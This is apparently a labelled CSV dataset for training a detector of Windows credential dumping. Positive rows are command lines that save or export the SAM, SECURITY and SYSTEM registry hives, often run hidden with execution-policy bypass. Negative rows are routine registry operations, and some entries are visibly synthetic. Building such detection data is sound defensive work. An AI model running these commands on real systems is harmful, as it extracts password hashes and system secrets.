text,label
"cmd /c reg   save   ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey24""   ""c:\windows\temp\software_dump.dat""   /y",0
"reg.exe add ""hku\system\currentcontrolset\services\subkey70"" /v path  /d 1",0
cmd.exe /c reg  save   hklm\sam   c:\temp\system.hive   /y,1
"reg   save   ""hkcu\system\currentcontrolset\services\subkey11""   ""d:\backup\registry_hive.dat""",0
powershell -exec bypass -w hidden -c reg.exe   save   hkey_local_machine\sam   \.\c$ackup.reg,1
"powershell -c reg.exe copy ""hkey_users\software\classes"" ""hkey_users\control panel\desktop_994""",0
"cmd /c powershell -c ""reg export  hklm\system   \\localhost\c$\__dump\sam.bak  /y""",1
"reg compare ""hkey_users\software\policies\mycorp\subkey61"" ""hkey_users\hkey_local_machine\system\currentcontrolset\control_212""",0
cmd.exe /c reg  export hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak,1
powershell -exec bypass -w hidden -c reg.exe  export   hklm\sam  c:\temp\system.hive,1
"cmd /c powershell -c ""reg.exe export hklm\system  c:\windows\temp\sam.save  /y""",1
reg,0
cmd.exe /c reg.exe  save  hklm\security  c:\users\public\registry_export.reg,1
"reg add ""hkcu\hkey_local_machine\software\policies\microsoft\subkey86""  /t reg_sz /d 1",0
"start /b reg copy ""hkcu\software\google\chrome\subkey37"" ""hkcu\software\policies\mycorp_471""",0
"reg.exe unload ""hkcu\software\policies\mycorp\subkey44"" /f",0
reg save  hklm\security  c:\windows\temp\sam.save,1
"reg query ""hkcu\control panel\desktop\subkey53"" /f",0
reg   save  hklm\security %temp%\sec_backup.dat   /y,1
"reg.exe   delete   ""hku\environment""   /v path",0
powershell -exec bypass -w hidden -c reg  save hkey_local_machine\security %temp%\sec_backup.dat,1
pwsh -noprofile -c reg  export hklm\sam   c:\users\public\registry_export.reg /y,1
"reg  restore  ""hkcu\hkey_local_machine\software\policies\microsoft""  ""hkcu\software\google\chrome_598""",0
reg.exe save   hkey_local_machine\security \\localhost\c$\__dump\sam.bak,1
pwsh -noprofile -c reg  save  hkey_local_machine\security   c:\windows\temp\sam.save  /y,1
"reg   compare   ""hkey_local_machine\control panel\desktop\subkey75""   ""hkey_local_machine\environment_739""",0
"reg copy ""hkey_local_machine\system\currentcontrolset\services\subkey93"" ""hkey_local_machine\software\classes_435""",0
pwsh -noprofile -c reg  save hklm\system   c:\temp\system.hive /y,1
pwsh -noprofile -c reg.exe  save  hkey_local_machine\security  %temp%\sec_backup.dat   /y,1
"reg   save   ""hku\environment""   ""%temp%\non_sensitive.hive""",0
cmd.exe /c start /b reg  save   hklm\sam  c:\windows\temp\sam.save,1
"reg copy ""hku\hkey_local_machine\software\policies\microsoft\subkey70"" ""hku\software\microsoft\windows\currentversion_499""",0
c:\windows\system32\cmd.exe /k reg.exe   export hklm\sam  \.\c$ackup.reg,1
powershell -exec bypass -w hidden -c reg.exe  save hklm\system \\localhost\c$\__dump\sam.bak /y,1
c:\windows\system32\cmd.exe /k reg   save hkey_local_machine\security c:\temp\system.hive /y,1
"cmd /c reg  restore  ""hkcu\hkey_local_machine\software\policies\microsoft""  ""hkcu\hkey_local_machine\software\policies\microsoft_890""",0
"reg.exe   unload   ""hkcu\hkey_local_machine\software\policies\microsoft""   /v path",0
powershell -command reg.exe  save  hklm\security  %temp%\sec_backup.dat,1
"cmd /c reg.exe add ""hku\software\myapp\settings"" /f /t reg_dword",0
"reg.exe  copy  ""hkey_current_user\hkey_local_machine\software\wow6432node""  ""hkey_current_user\hkey_local_machine\software\policies\microsoft_403""",0
powershell -exec bypass -w hidden -c reg.exe   export  hkey_local_machine\system   \\localhost\c$\__dump\sam.bak,1
c:\windows\system32\cmd.exe /k reg   export hkey_local_machine\system   c:\users\public\registry_export.reg /y,1
"reg   delete   ""hku\hkey_local_machine\software\wow6432node""   /v path",0
"powershell -c reg.exe  restore  ""hku\control panel\desktop\subkey73""  ""hku\software\myapp\settings_527""",0
"reg.exe   restore   ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey11""   ""hkey_local_machine\software\microsoft\windows\currentversion_118""",0
"reg.exe restore ""hkey_local_machine\software\google\chrome\subkey91"" ""hkey_local_machine\environment_302""",0
"start /b reg compare ""hkey_current_user\software\classes"" ""hkey_current_user\system\currentcontrolset\services_211""",0
powershell -command reg save   hkey_local_machine\security   \\localhost\c$\__dump\sam.bak,1
"reg query ""hku\control panel\desktop"" /f",0
"reg  restore  ""hkcu\software\google\chrome\subkey26""  ""hkcu\system\currentcontrolset\services_453""",0
"reg   delete   ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey9""   /f",0
"cmd /c reg   delete   ""hkey_current_user\software\policies\mycorp\subkey20""   /v version",0
"reg.exe   delete   ""hkey_users\software\classes\subkey28""   /v path",0
"reg.exe   save   ""hkcu\system\currentcontrolset\services\subkey53""   ""c:\temp\user_settings.reg""",0
powershell -exec bypass -w hidden -c reg  export  hkey_local_machine\system   \\localhost\c$\__dump\sam.bak,1
"reg.exe delete ""hkey_current_user\control panel\desktop\subkey64"" /f",0
"reg   unload   ""hku\hkey_local_machine\software\wow6432node""   /v path",0
c:\windows\system32\cmd.exe /k reg   save   hkey_local_machine\sam c:\windows\temp\sam.save,1
"powershell -c reg add ""hku\software\classes"" /v lastupdate  /d ""c:\program files\app""",0
pwsh -noprofile -c reg.exe export  hkey_local_machine\security %temp%\sec_backup.dat /y,1
reg export hkey_local_machine\security c:\windows\temp\sam.save  /y,1
powershell -command reg.exe   save hklm\security   c:\users\public\registry_export.reg   /y,1
"cmd /c reg.exe   restore   ""hkey_local_machine\environment\subkey67""   ""hkey_local_machine\system\currentcontrolset\services_124""",0
powershell -exec bypass -w hidden -c reg.exe export   hkey_local_machine\security  c:\temp\system.hive,1
cmd.exe /c start /b reg.exe  save   hklm\system   \.\c$ackup.reg   /y,1
powershell -exec bypass -w hidden -c reg   save   hkey_local_machine\sam   \.\c$ackup.reg,1
cmd.exe /c reg save hklm\sam c:\temp\system.hive   /y,1
c:\windows\system32\cmd.exe /k reg   save hkey_local_machine\security  c:\users\public\registry_export.reg,1
pwsh -noprofile -c reg export  hklm\system   c:\temp\system.hive,1
cmd.exe /c reg.exe   export hkey_local_machine\system  \\localhost\c$\__dump\sam.bak   /y,1
"cmd /c reg  copy  ""hkey_local_machine\environment\subkey30""  ""hkey_local_machine\hkey_local_machine\software\policies\microsoft_915""",0
"reg.exe   query   ""hkey_users\software\google\chrome\subkey14""",0
pwsh -noprofile -c reg.exe export hkey_local_machine\security  \.\c$ackup.reg   /y,1
pwsh -noprofile -c reg   save  hklm\sam  c:\windows\temp\sam.save   /y,1
"cmd /c powershell -c ""reg  export hklm\sam   \.\c$ackup.reg""",1
c:\windows\system32\cmd.exe /k reg.exe  export hklm\security  \\localhost\c$\__dump\sam.bak,1
powershell -command reg.exe export hkey_local_machine\sam c:\windows\temp\sam.save  /y,1
"powershell -c reg.exe   add   ""hkey_local_machine\software\microsoft\windows\currentversion\subkey71""   /f   /t reg_sz   /d ""c:\program files\app""",0
"cmd /c reg   restore   ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control""   ""hkey_current_user\hkey_local_machine\software\wow6432node_851""",0
powershell -exec bypass -w hidden -c reg.exe   export hkey_local_machine\system %temp%\sec_backup.dat /y,1
cmd.exe /c start /b reg.exe   export  hkey_local_machine\sam   c:\temp\system.hive,1
"cmd /c powershell -c ""reg save hkey_local_machine\system %temp%\sec_backup.dat""",1
powershell -exec bypass -w hidden -c reg.exe  save hkey_local_machine\system c:\temp\system.hive  /y,1
cmd.exe /c start /b reg.exe  save  hkey_local_machine\system   \.\c$ackup.reg   /y,1
"reg.exe restore ""hkey_users\software\classes"" ""hkey_users\software\microsoft\windows\currentversion_170""",0
powershell -exec bypass -w hidden -c reg.exe  export  hkey_local_machine\security \.\c$ackup.reg,1
cmd.exe /c reg.exe   export  hkey_local_machine\sam \\localhost\c$\__dump\sam.bak,1
"reg.exe  copy  ""hkey_users\system\currentcontrolset\services""  ""hkey_users\software\policies\mycorp_534""",0
"reg  restore  ""hkey_current_user\hkey_local_machine\software\policies\microsoft\subkey36""  ""hkey_current_user\software\google\chrome_990""",0
"powershell -c reg.exe  compare  ""hku\software\classes\subkey59""  ""hku\control panel\desktop_429""",0
"reg query ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey26"" /v path",0
tasklist.exe,0
powershell -exec bypass -w hidden -c reg.exe export hkey_local_machine\security %temp%\sec_backup.dat,1
"reg.exe compare ""hkey_users\environment\subkey79"" ""hkey_users\hkey_local_machine\system\currentcontrolset\control_897""",0
"cmd /c powershell -c ""reg.exe  export  hklm\sam   c:\windows\temp\sam.save  /y""",1
cmd.exe /c reg.exe export hklm\system c:\users\public\registry_export.reg   /y,1
reg query,0
cmd.exe /c start /b reg.exe export  hklm\system  c:\windows\temp\sam.save,1
reg  save hkey_local_machine\sam   \.\c$ackup.reg /y,1
cmd.exe /c reg   export  hklm\system \\localhost\c$\__dump\sam.bak   /y,1
attrib -h -s C:\temp\my_file.txt,0
pwsh -noprofile -c reg   save  hkey_local_machine\security  \.\c$ackup.reg  /y,1
"reg.exe   delete   ""hkey_current_user\software\classes\subkey61""   /v path",0
"reg.exe   unload   ""hku\hkey_local_machine\system\currentcontrolset\control\subkey34""   /f",0
powershell -command reg   save  hklm\system   \.\c$ackup.reg  /y,1
"cmd /c powershell -c ""reg export hklm\security  c:\users\public\registry_export.reg""",1
"reg.exe  delete  ""hkey_local_machine\system\currentcontrolset\services\subkey98""  /v version",0
"start /b reg.exe   unload   ""hkey_users\system\currentcontrolset\services\subkey83""   /v version",0
powershell -exec bypass -w hidden -c reg  save   hkey_local_machine\sam  \.\c$ackup.reg,1
pwsh -noprofile -c reg save   hklm\system c:\temp\system.hive,1
"cmd /c reg  unload  ""hkey_users\software\microsoft\windows\currentversion\subkey25""",0
"reg save ""hkey_local_machine\hkey_local_machine\software\wow6432node"" ""c:\windows\temp\software_dump.dat""",0
"reg  query  ""hkey_current_user\hkey_local_machine\software\policies\microsoft\subkey1""  /v lastupdate",0
"cmd /c powershell -c ""reg.exe   save   hkey_local_machine\system  c:\users\public\registry_export.reg""",1
cmd.exe /c reg export hklm\system   \\localhost\c$\__dump\sam.bak,1
c:\windows\system32\cmd.exe /k reg  save  hklm\sam c:\users\public\registry_export.reg /y,1
"reg.exe compare ""hkey_current_user\control panel\desktop\subkey17"" ""hkey_current_user\software\myapp\settings_583""",0
cmd.exe /c reg.exe export   hkey_local_machine\sam \\localhost\c$\__dump\sam.bak,1
"reg.exe  query  ""hkey_current_user\software\policies\mycorp""  /v lastupdate",0
"reg   add   ""hkcu\software\classes\subkey65""      /t reg_dword   /d 1",0
cmd.exe /c reg.exe  save  hklm\system \\localhost\c$\__dump\sam.bak   /y,1
pwsh -noprofile -c reg.exe export   hklm\system   \\localhost\c$\__dump\sam.bak,1
powershell -exec bypass -w hidden -c reg.exe   export  hklm\system  \.\c$ackup.reg,1
"cmd /c reg   save   ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey56""   ""d:\backup\registry_hive.dat""   /y",0
"cmd /c reg.exe   save   ""hkey_local_machine\software\myapp\settings""   ""c:\temp\user_settings.reg""   /y",0
c:\windows\system32\cmd.exe /k reg  export  hklm\sam   \\localhost\c$\__dump\sam.bak,1
powershell -exec bypass -w hidden -c reg export  hkey_local_machine\system  c:\users\public\registry_export.reg,1
powershell -command reg   save   hkey_local_machine\security  %temp%\sec_backup.dat  /y,1
"reg restore ""hkey_current_user\control panel\desktop"" ""hkey_current_user\system\currentcontrolset\services_400""",0
"reg  delete  ""hkey_users\system\currentcontrolset\services\subkey30""",0
"cmd /c powershell -c ""reg.exe  export  hkey_local_machine\system   c:\windows\temp\sam.save  /y""",1
"reg   restore   ""hkey_current_user\hkey_local_machine\software\policies\microsoft\subkey39""   ""hkey_current_user\hkey_local_machine\software\policies\microsoft_192""",0
cmd.exe /c reg   save  hklm\sam   %temp%\sec_backup.dat /y,1
c:\windows\system32\cmd.exe /k reg.exe  save   hkey_local_machine\sam   c:\users\public\registry_export.reg,1
cmd.exe /c reg   save   hklm\system  %temp%\sec_backup.dat,1
"cmd /c reg   save   ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control""   ""d:\backup\registry_hive.dat""",0
powershell -exec bypass -w hidden -c reg  save  hklm\system   c:\temp\system.hive /y,1
"reg unload ""hkey_users\control panel\desktop""",0
cmd.exe /c start /b reg export hkey_local_machine\sam   c:\temp\system.hive,1
pwsh -noprofile -c reg.exe  export hkey_local_machine\system   \\localhost\c$\__dump\sam.bak,1
reg.exe export  hkey_local_machine\system  %temp%\sec_backup.dat /y,1
"cmd /c powershell -c ""reg.exe save  hkey_local_machine\system  \\localhost\c$\__dump\sam.bak  /y""",1
powershell -command reg save  hklm\sam  \\localhost\c$\__dump\sam.bak,1
pwsh -noprofile -c reg save hklm\security   c:\windows\temp\sam.save  /y,1
"cmd /c reg.exe  delete  ""hkey_users\software\microsoft\windows\currentversion\subkey77""  /v path",0
powershell -exec bypass -w hidden -c reg  export   hklm\security   c:\temp\system.hive,1
"powershell -c reg.exe  save  ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control""  ""c:\windows\temp\software_dump.dat""",0
cmd.exe /c reg.exe   export  hkey_local_machine\system   c:\users\public\registry_export.reg,1
"cmd /c reg   compare   ""hkcu\software\classes""   ""hkcu\software\policies\mycorp_367""",0
"reg.exe restore ""hkey_users\software\myapp\settings"" ""hkey_users\hkey_local_machine\software\wow6432node_751""",0
"reg.exe   delete   ""hkey_current_user\hkey_local_machine\software\policies\microsoft""   /f",0
"reg.exe save ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey37"" ""c:\windows\temp\software_dump.dat""",0
powershell -exec bypass -w hidden -c reg  save   hklm\sam c:\users\public\registry_export.reg,1
pwsh -noprofile -c reg   save   hkey_local_machine\system  c:\users\public\registry_export.reg,1
"reg   restore   ""hku\environment\subkey32""   ""hku\system\currentcontrolset\services_493""",0
powershell -exec bypass -w hidden -c reg.exe save   hklm\system  \.\c$ackup.reg   /y,1
"reg   unload   ""hku\software\myapp\settings""   /v lastupdate",0
powershell -command reg   save   hkey_local_machine\system   c:\windows\temp\sam.save  /y,1
cmd.exe /c start /b reg.exe save   hkey_local_machine\security c:\temp\system.hive  /y,1
"reg.exe   compare   ""hkcu\hkey_local_machine\system\currentcontrolset\control\subkey100""   ""hkcu\software\myapp\settings_697""",0
pwsh -noprofile -c reg.exe save  hkey_local_machine\system   c:\users\public\registry_export.reg /y,1
c:\windows\system32\cmd.exe /k reg  save  hklm\security  %temp%\sec_backup.dat,1
pwsh -noprofile -c reg.exe export hkey_local_machine\security \.\c$ackup.reg,1
"start /b reg   unload   ""hkey_users\environment\subkey50""   /f",0
cmd.exe /c start /b reg.exe   save   hklm\sam  c:\users\public\registry_export.reg,1
cmd.exe /c start /b reg  export hklm\security  c:\windows\temp\sam.save,1
powershell -exec bypass -w hidden -c reg   export   hklm\system \\localhost\c$\__dump\sam.bak /y,1
"start /b reg.exe  save  ""hkey_local_machine\hkey_local_machine\software\policies\microsoft""  ""%temp%\non_sensitive.hive""",0
reg  export   hklm\security   %temp%\sec_backup.dat,1
"cmd /c reg.exe  unload  ""hkey_local_machine\environment""  /v version",0
cmd.exe /c start /b reg   export hkey_local_machine\sam   c:\users\public\registry_export.reg,1
"reg.exe compare ""hkey_users\hkey_local_machine\software\wow6432node"" ""hkey_users\control panel\desktop_843""",0
pwsh -noprofile -c reg.exe  save   hkey_local_machine\security \.\c$ackup.reg,1
"reg   compare   ""hku\hkey_local_machine\software\policies\microsoft""   ""hku\system\currentcontrolset\services_583""",0
pwsh -noprofile -c reg.exe   save  hkey_local_machine\system  c:\temp\system.hive /y,1
"powershell -c reg  unload  ""hkcu\hkey_local_machine\software\policies\microsoft""  /v path",0
pwsh -noprofile -c reg   export  hklm\security  c:\temp\system.hive  /y,1
"cmd /c powershell -c ""reg.exe  export hkey_local_machine\security   \\localhost\c$\__dump\sam.bak""",1
cmd.exe /c start /b reg.exe   export  hkey_local_machine\security  c:\windows\temp\sam.save,1
powershell -command reg  save hklm\security   \.\c$ackup.reg,1
cmd.exe /c start /b reg  save hklm\system \.\c$ackup.reg,1
"cmd /c reg delete ""hku\software\policies\mycorp""",0
cmd.exe /c start /b reg  export hkey_local_machine\sam  \.\c$ackup.reg,1
"reg.exe  copy  ""hkcu\environment\subkey18""  ""hkcu\hkey_local_machine\software\wow6432node_409""",0
cmd.exe /c start /b reg export hkey_local_machine\security c:\windows\temp\sam.save  /y,1
reg  export  hklm\system  c:\temp\system.hive /y,1
"reg   unload   ""hkey_current_user\control panel\desktop""",0
"reg.exe unload ""hkey_users\software\myapp\settings"" /v path",0
cmd.exe /c start /b reg.exe export hklm\sam   c:\windows\temp\sam.save   /y,1
reg.exe  save  hkey_local_machine\system  \.\c$ackup.reg  /y,1
pwsh -noprofile -c reg   export  hkey_local_machine\security   \\localhost\c$\__dump\sam.bak /y,1
"reg.exe  restore  ""hkey_users\environment""  ""hkey_users\software\policies\mycorp_422""",0
powershell -command reg.exe save   hklm\sam  c:\windows\temp\sam.save,1
"reg compare ""hku\system\currentcontrolset\services"" ""hku\hkey_local_machine\software\policies\microsoft_782""",0
reg.exe   export  hklm\sam %temp%\sec_backup.dat,1
"reg.exe  save  ""hkey_current_user\hkey_local_machine\software\policies\microsoft""  ""c:\windows\temp\software_dump.dat""",0
cmd.exe /c reg save  hklm\system  \\localhost\c$\__dump\sam.bak,1
"start /b reg   add   ""hkey_local_machine\system\currentcontrolset\services""   /f   /t reg_sz   /d ""c:\program files\app""",0
c:\windows\system32\cmd.exe /k reg   export hklm\system   c:\temp\system.hive,1
c:\windows\system32\cmd.exe /k reg   export hklm\security   c:\windows\temp\sam.save,1
cmd.exe /c reg   export   hklm\security   c:\temp\system.hive,1
"reg.exe delete ""hkey_current_user\system\currentcontrolset\services\subkey75"" /f",0
pwsh -noprofile -c reg   save   hklm\security   c:\windows\temp\sam.save  /y,1
"start /b reg.exe   restore   ""hkey_local_machine\software\classes""   ""hkey_local_machine\software\classes_747""",0
"cmd /c powershell -c ""reg export  hklm\sam  c:\users\public\registry_export.reg""",1
"cmd /c reg  query  ""hkcu\hkey_local_machine\system\currentcontrolset\control\subkey85""  /f",0
cmd.exe /c reg  export   hkey_local_machine\system \.\c$ackup.reg,1
"powershell -c reg add ""hkcu\software\policies\mycorp\subkey54"" /v version /t reg_dword /d ""1.0.0""",0
"reg save ""hkey_local_machine\hkey_local_machine\software\wow6432node"" ""%temp%\non_sensitive.hive""",0
cmd.exe /c reg.exe   export hkey_local_machine\sam   c:\users\public\registry_export.reg,1
"reg   restore   ""hkey_local_machine\control panel\desktop\subkey66""   ""hkey_local_machine\system\currentcontrolset\services_174""",0
"reg.exe   unload   ""hkey_local_machine\software\classes""",0
cmd.exe /c reg.exe  export   hkey_local_machine\system \\localhost\c$\__dump\sam.bak  /y,1
"reg.exe   query   ""hkey_users\control panel\desktop\subkey7""   /f",0
cmd.exe /c start /b reg export  hklm\security c:\windows\temp\sam.save,1
"start /b reg.exe compare ""hkey_users\software\policies\mycorp\subkey63"" ""hkey_users\software\microsoft\windows\currentversion_667""",0
powershell -command reg.exe   save hklm\system  c:\temp\system.hive  /y,1
"reg  delete  ""hku\hkey_local_machine\system\currentcontrolset\control""  /v lastupdate",0
"reg.exe unload ""hkey_users\environment\subkey61""",0
powershell -command reg   export   hklm\system  %temp%\sec_backup.dat  /y,1
c:\windows\system32\cmd.exe /k reg save  hkey_local_machine\system   %temp%\sec_backup.dat   /y,1
cmd.exe /c start /b reg.exe  save   hklm\security  %temp%\sec_backup.dat   /y,1
c:\windows\system32\cmd.exe /k reg.exe save  hkey_local_machine\sam \\localhost\c$\__dump\sam.bak /y,1
cmd.exe /c start /b reg.exe   export   hklm\sam c:\temp\system.hive,1
"powershell -c reg   delete   ""hkcu\software\classes""   /f",0
"reg copy ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control\subkey100"" ""hkey_current_user\software\classes_615""",0
cmd.exe /c reg  export  hklm\system \.\c$ackup.reg,1
"cmd /c reg  delete  ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey49""  /v version",0
reg.exe,0
"cmd /c reg.exe save ""hkey_local_machine\control panel\desktop\subkey63"" ""d:\backup\registry_hive.dat""",0
"reg  compare  ""hku\hkey_local_machine\software\wow6432node\subkey26""  ""hku\hkey_local_machine\software\policies\microsoft_647""",0
cmd.exe /c reg.exe  save  hklm\security  \\localhost\c$\__dump\sam.bak,1
"reg  add  ""hkey_current_user\control panel\desktop""  /v path    /d ""c:\program files\app""",0
reg  export  hkey_local_machine\security \.\c$ackup.reg   /y,1
"start /b reg.exe query ""hku\hkey_local_machine\software\policies\microsoft\subkey41"" /v version",0
pwsh -noprofile -c reg.exe   export   hkey_local_machine\security   c:\temp\system.hive /y,1
cmd.exe /c reg.exe save   hklm\sam  c:\users\public\registry_export.reg /y,1
"start /b reg.exe   delete   ""hkcu\system\currentcontrolset\services\subkey55""   /f",0
powershell -command reg save hkey_local_machine\system  %temp%\sec_backup.dat,1
cmd.exe /c reg.exe   export  hkey_local_machine\security   c:\temp\system.hive,1
"cmd /c powershell -c ""reg.exe save   hkey_local_machine\sam c:\users\public\registry_export.reg""",1
"reg restore ""hkey_current_user\hkey_local_machine\software\wow6432node"" ""hkey_current_user\system\currentcontrolset\services_723""",0
"reg.exe query ""hkey_local_machine\system\currentcontrolset\services\subkey40""",0
cmd.exe /c start /b reg.exe   export hkey_local_machine\system   c:\users\public\registry_export.reg,1
cmd.exe /c start /b reg.exe   save  hklm\system   \.\c$ackup.reg,1
"powershell -c reg  delete  ""hkey_users\software\policies\mycorp\subkey56""",0
"cmd /c powershell -c ""reg.exe export  hklm\system  c:\windows\temp\sam.save""",1
powershell -command reg.exe export hklm\system   %temp%\sec_backup.dat,1
pwsh -noprofile -c reg.exe   save  hklm\system   c:\windows\temp\sam.save,1
powershell -exec bypass -w hidden -c reg.exe save  hkey_local_machine\system c:\windows\temp\sam.save   /y,1
"start /b reg unload ""hkcu\environment"" /v version",0
"cmd /c reg.exe   delete   ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control""   /v version",0
reg save  hklm\security \\localhost\c$\__dump\sam.bak  /y,1
powershell -exec bypass -w hidden -c reg  export  hklm\security %temp%\sec_backup.dat,1
c:\windows\system32\cmd.exe /k reg.exe export   hkey_local_machine\sam   c:\temp\system.hive  /y,1
"cmd /c powershell -c ""reg  export   hklm\sam  c:\temp\system.hive /y""",1
powershell -command reg.exe  export  hkey_local_machine\sam %temp%\sec_backup.dat,1
"reg.exe save ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey18"" ""c:\users\public\chrome_data.bak"" /y",0
"reg unload ""hkey_users\hkey_local_machine\software\wow6432node\subkey5"" /v lastupdate",0
"cmd /c reg   unload   ""hkcu\software\google\chrome""   /v version",0
"reg  unload  ""hkey_users\system\currentcontrolset\services""  /f",0
"reg   add   ""hkcu\control panel\desktop""   /v path   /t reg_sz",0
powershell -command reg.exe export  hklm\sam c:\users\public\registry_export.reg  /y,1
c:\windows\system32\cmd.exe /k reg.exe  save   hkey_local_machine\sam   c:\temp\system.hive,1
pwsh -noprofile -c reg save   hklm\sam   %temp%\sec_backup.dat /y,1
"reg  save  ""hku\hkey_local_machine\software\policies\microsoft""  ""c:\windows\temp\software_dump.dat""  /y",0
powershell -command reg.exe  export  hklm\sam   c:\windows\temp\sam.save   /y,1
cmd.exe /c start /b reg.exe   export   hklm\system  %temp%\sec_backup.dat,1
cmd.exe /c start /b reg.exe save hkey_local_machine\sam c:\users\public\registry_export.reg,1
"cmd /c reg.exe unload ""hkey_current_user\control panel\desktop"" /v path",0
"start /b reg.exe  save  ""hkey_current_user\software\microsoft\windows\currentversion\subkey98""  ""%temp%\non_sensitive.hive""  /y",0
powershell -exec bypass -w hidden -c reg  export   hklm\system   %temp%\sec_backup.dat,1
"reg  add  ""hkcu\software\google\chrome\subkey96""  /f  /t reg_sz  /d ""c:\program files\app""",0
powershell -c reg.exe save HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet C:\temp\currentcontrolset.dat,0
"reg.exe copy ""hkey_local_machine\system\currentcontrolset\services\subkey40"" ""hkey_local_machine\software\myapp\settings_229""",0
reg export  hkey_local_machine\system   \.\c$ackup.reg   /y,1
"reg   unload   ""hkey_users\control panel\desktop""   /f",0
"powershell -c reg.exe  add  ""hku\software\classes""  /f",0
"cmd /c powershell -c ""reg export hklm\security   \.\c$ackup.reg  /y""",1
"reg.exe restore ""hkey_current_user\software\microsoft\windows\currentversion"" ""hkey_current_user\software\classes_205""",0
"reg copy ""hkey_local_machine\software\policies\mycorp"" ""hkey_local_machine\system\currentcontrolset\services_418""",0
powershell -command reg  save  hkey_local_machine\sam \\localhost\c$\__dump\sam.bak   /y,1
cmd.exe /c reg export  hklm\system   %temp%\sec_backup.dat   /y,1
"reg  copy  ""hkey_users\software\policies\mycorp""  ""hkey_users\hkey_local_machine\software\policies\microsoft_282""",0
"start /b reg copy ""hkey_current_user\software\classes\subkey38"" ""hkey_current_user\software\classes_701""",0
"start /b reg.exe  save  ""hkcu\software\classes""  ""d:\backup\registry_hive.dat""",0
"cmd /c powershell -c ""reg.exe export   hklm\sam c:\temp\system.hive""",1
powershell -exec bypass -w hidden -c reg.exe  export hkey_local_machine\security   \\localhost\c$\__dump\sam.bak,1
"start /b reg  add  ""hku\hkey_local_machine\software\policies\microsoft\subkey82""  /v version  /t reg_sz",0
"reg  save  ""hkey_local_machine\hkey_local_machine\software\wow6432node""  ""d:\backup\registry_hive.dat""",0
powershell -exec bypass -w hidden -c reg.exe  export hkey_local_machine\system  \\localhost\c$\__dump\sam.bak,1
cmd.exe /c start /b reg.exe save hkey_local_machine\sam  %temp%\sec_backup.dat  /y,1
powershell -command reg  save  hklm\security   \.\c$ackup.reg  /y,1
"reg.exe compare ""hku\hkey_local_machine\software\wow6432node"" ""hku\control panel\desktop_749""",0
"cmd /c reg  delete  ""hkey_current_user\environment\subkey51""  /v path",0
"reg save ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey19"" ""d:\backup\registry_hive.dat"" /y",0
"reg.exe   save   ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey92""   ""c:\temp\user_settings.reg""",0
pwsh -noprofile -c reg.exe export hklm\system   %temp%\sec_backup.dat /y,1
cmd.exe /c reg.exe   save  hkey_local_machine\security \.\c$ackup.reg,1
"reg.exe  save  ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey24""  ""%temp%\non_sensitive.hive""",0
reg.exe  export hkey_local_machine\sam   \.\c$ackup.reg  /y,1
"cmd /c powershell -c ""reg   save   hkey_local_machine\security \\localhost\c$\__dump\sam.bak""",1
"cmd /c powershell -c ""reg.exe   save   hkey_local_machine\security  c:\temp\system.hive   /y""",1
"cmd /c reg  copy  ""hkey_current_user\software\myapp\settings""  ""hkey_current_user\software\policies\mycorp_336""",0
c:\windows\system32\cmd.exe /k reg save   hklm\system c:\windows\temp\sam.save,1
powershell -command reg.exe  export  hkey_local_machine\security  %temp%\sec_backup.dat   /y,1
cmd.exe /c reg   export  hkey_local_machine\security c:\temp\system.hive  /y,1
c:\windows\system32\cmd.exe /k reg.exe  save   hklm\system c:\users\public\registry_export.reg,1
cmd.exe /c start /b reg.exe   export   hkey_local_machine\security   c:\temp\system.hive,1
reg  export hkey_local_machine\security \\localhost\c$\__dump\sam.bak,1
"start /b reg.exe  add  ""hku\hkey_local_machine\system\currentcontrolset\control\subkey41""  /f  /t reg_sz  /d ""1.0.0""",0
